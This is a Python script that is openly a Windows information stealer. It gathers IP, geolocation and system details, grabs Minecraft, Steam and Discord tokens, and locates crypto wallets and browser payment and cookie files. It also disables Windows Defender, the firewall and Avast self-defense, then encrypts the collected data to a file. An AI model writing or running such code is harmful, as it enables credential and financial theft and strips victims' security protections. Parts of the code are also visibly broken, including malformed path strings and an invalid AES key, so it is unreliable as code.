import os
import re
import requests
import platform
import psutil
import winreg
import subprocess
import json
import base64
import zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Obfuscation Function
def obfuscate_string(s):
    obfuscated = ''
    for char in s:
        obfuscated += chr(ord(char) + 1)
    return obfuscated

# De-obfuscation Function
def deobfuscate_string(s):
    deobfuscated = ''
    for char in s:
        deobfuscated += chr(ord(char) - 1)
    return deobfuscated

# Personal Data Extraction
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        return response.json()['ip']
    except requests.RequestException as e:
        print(f"Error getting public IP: {e}")
        return None

def get_geolocation(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/')
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error getting geolocation: {e}")
        return None

def get_hardware_specs():
    try:
        specs = {
            'CPU': platform.processor(),
            'RAM': str(psutil.virtual_memory().total / (1024 ** 3)) + ' GB',
            'GPU': 'N/A'  # Requires additional libraries like GPUtil
        }
        return specs
    except Exception as e:
        print(f"Error getting hardware specs: {e}")
        return None

def get_os_details():
    try:
        return platform.uname()
    except Exception as e:
        print(f"Error getting OS details: {e}")
        return None

def get_installed_programs():
    programs = []
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as key:
            i = 0
            while True:
                try:
                    subkey = winreg.EnumKey(key, i)
                    with winreg.OpenKey(key, subkey) as subkey_handle:
                        display_name = winreg.QueryValueEx(subkey_handle, "DisplayName")[0]
                        programs.append(display_name)
                    i += 1
                except OSError:
                    break
    except Exception as e:
        print(f"Error getting installed programs: {e}")
    return programs

# Gaming Credentials
def get_minecraft_tokens():
    minecraft_dir = os.path.expanduser('~') + r'\AppData\Roaming\.minecraft'
    try:
        for root, dirs, files in os.walk(minecraft_dir):
            for file in files:
                if file.endswith('.properties'):
                    with open(os.path.join(root, file), 'r') as f:
                        for line in f:
                            if 'authenticationToken' in line:
                                return line.split('=')[1].strip()
    except Exception as e:
        print(f"Error getting Minecraft tokens: {e}")
    return None

def get_steam_credentials():
    steam_dir = os.path.expanduser('~') + r'\AppData\Roaming\Steam'
    config_file = os.path.join(steam_dir, 'config', 'loginusers.vdf')
    try:
        with open(config_file, 'r') as f:
            for line in f:
                if 'AccountName' in line:
                    return line.split('"')[3]
    except Exception as e:
        print(f"Error getting Steam credentials: {e}")
    return None

def get_discord_tokens():
    discord_dir = os.path.expanduser('~') + r'\AppData\Roaming\Discord'
    try:
        for root, dirs, files in os.walk(discord_dir):
            for file in files:
                if file == 'Local Storage':
                    with open(os.path.join(root, file), 'r') as f:
                        for line in f:
                            if 'token' in line:
                                return line.split('"')[3]
    except Exception as e:
        print(f"Error getting Discord tokens: {e}")
    return None

# Financial Data (Beta)
def get_cryptocurrency_wallets():
    wallets = []
    patterns = [r'\.wallet', r'\.seed']
    try:
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                for pattern in patterns:
                    if re.search(pattern, file, re.IGNORECASE):
                        wallets.append(os.path.join(root, file))
    except Exception as e:
        print(f"Error getting cryptocurrency wallets: {e}")
    return wallets

def get_browser_payment_methods():
    browsers = ['Chrome', 'Firefox', 'Edge']
    payment_methods = []
    try:
        for browser in browsers:
            browser_path = os.path.expanduser('~') + f'r\AppData\Local\{browser}\User Data\Default'
            if os.path.exists(browser_path):
                payment_methods.append(os.path.join(browser_path, 'webdata'))
    except Exception as e:
        print(f"Error getting browser payment methods: {e}")
    return payment_methods

def get_banking_cookies():
    browsers = ['Chrome', 'Firefox', 'Edge']
    cookies = []
    try:
        for browser in browsers:
            browser_path = os.path.expanduser('~') + f'r\AppData\Local\{browser}\User Data\Default'
            if os.path.exists(browser_path):
                cookies.append(os.path.join(browser_path, 'Cookies'))
    except Exception as e:
        print(f"Error getting banking cookies: {e}")
    return cookies

# Security Bypass
def evade_windows_defender():
    try:
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error evading Windows Defender: {e}")

def modify_firewall():
    try:
        subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error modifying firewall: {e}")

def bypass_antivirus():
    try:
        # Example for Avast: Disable self-defense
        subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Avast Software\Avast', '/v', 'SelfDefense', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error bypassing antivirus: {e}")

# Auto-Locate File Directories
def search_directory(directory, patterns):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                for pattern in patterns:
                    if re.search(pattern, file, re.IGNORECASE):
                        yield os.path.join(root, file)
    except Exception as e:
        print(f"Error searching directory: {e}")

# Encryption Function
def encrypt_data(data, password):
    try:
        cipher = AES.new(base64.b64decode(password), AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return iv + ct
    except Exception as e:
        print(f"Error encrypting data: {e}")
        return None

# Decryption Function
def decrypt_data(encrypted_data, password):
    try:
        iv = base64.b64decode(encrypted_data[:24])
        ct = base64.b64decode(encrypted_data[24:])
        cipher = AES.new(base64.b64decode(password), AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return None

# Main Execution
if __name__ == "__main__":
    # Personal Data
    ip = get_public_ip()
    geo = get_geolocation(ip)
    specs = get_hardware_specs()
    os_details = get_os_details()
    programs = get_installed_programs()

    # Gaming Credentials
    minecraft_token = get_minecraft_tokens()
    steam_credentials = get_steam_credentials()
    discord_token = get_discord_tokens()

    # Financial Data
    crypto_wallets = get_cryptocurrency_wallets()
    browser_payment_methods = get_browser_payment_methods()
    banking_cookies = get_banking_cookies()

    # Security Bypass
    evade_windows_defender()
    modify_firewall()
    bypass_antivirus()

    # Output or transmit the collected data
    data = {
        'Personal Data': {
            'IP': ip,
            'Geolocation': geo,
            'Hardware Specs': specs,
            'OS Details': os_details,
            'Installed Programs': programs
        },
        'Gaming Credentials': {
            'Minecraft Token': minecraft_token,
            'Steam Credentials': steam_credentials,
            'Discord Token': discord_token
        },
        'Financial Data': {
            'Cryptocurrency Wallets': crypto_wallets,
            'Browser Payment Methods': browser_payment_methods,
            'Banking Cookies': banking_cookies
        }
    }

    # Convert data to JSON string
    data_json = json.dumps(data, indent=4)

    # Encrypt the data
    password = '0821' * 4  # Ensure the password is 32 bytes for AES-256
    encrypted_data = encrypt_data(data_json, password)

    if encrypted_data:
        # Save encrypted data to a file in the Downloads folder
        downloads_folder = os.path.expanduser('~') + r'\Downloads'
        output_file = os.path.join(downloads_folder, 'collected_data.txt')
        try:
            with open(output_file, 'w') as f:
                f.write(encrypted_data)
            print(f"Encrypted data has been saved to '{output_file}'")
        except Exception as e:
            print(f"Error saving encrypted data: {e}")

        # Decrypt and print the data
        decrypted_data = decrypt_data(encrypted_data, password)
        if decrypted_data:
            print("Decrypted Data:")
            print(decrypted_data)
        else:
            print("Failed to decrypt data.")
    else:
        print("Encryption failed.")